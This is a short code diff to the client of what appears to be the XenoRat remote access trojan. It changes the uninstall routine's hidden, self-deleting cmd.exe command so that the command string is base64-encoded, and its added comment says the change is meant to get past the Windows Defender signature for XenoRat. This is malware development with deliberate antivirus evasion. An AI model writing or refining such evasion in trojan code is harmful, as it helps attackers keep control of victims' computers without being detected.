@@ -251,10 +251,11 @@ namespace xeno_rat_client
         }
         public async static Task Uninstall() 
         {
+            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
             await RemoveStartup(Assembly.GetEntryAssembly().Location);
             Process.Start(new ProcessStartInfo()
             {
-                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\"",
+                Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICI=")) + Assembly.GetEntryAssembly().Location + "\"",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 FileName = "cmd.exe"
